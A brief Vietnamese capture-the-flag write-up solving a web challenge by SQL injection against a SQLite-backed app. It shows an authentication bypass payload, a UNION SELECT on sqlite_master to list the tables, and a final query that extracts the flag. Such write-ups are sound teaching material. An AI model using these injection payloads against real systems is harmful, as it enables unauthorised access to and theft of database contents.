# Web hacking
`capy3ra`

## Baby Address Note

1. Dựa vào source code biết được bài này là sql injection. Với câu truy vấn `f"SELECT * FROM users WHERE uid='{uid}';"` ta có thể bypass bằng `' OR '1'='1' --`
2. Khi thử 2 câu truy vấn bằng dấu ; thì nhận được message lỗi là chỉ cho phép 1 câu truy vấn.
3. Được biết db dùng sqlite3 nên ta sẽ dùng union select tới bảng sqlite_master để xem danh sách các bảng trong sql
```
' UNION SELECT sql,name,tbl_name from sqlite_master --
```
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/d695da1d-c61d-4f32-a065-856eccfe8c13)
4. Nhận thấy bảng chứa flag. Lấy flag bằng ``' UNION SELECT 1,2,flag from flag_9AbM4 --``
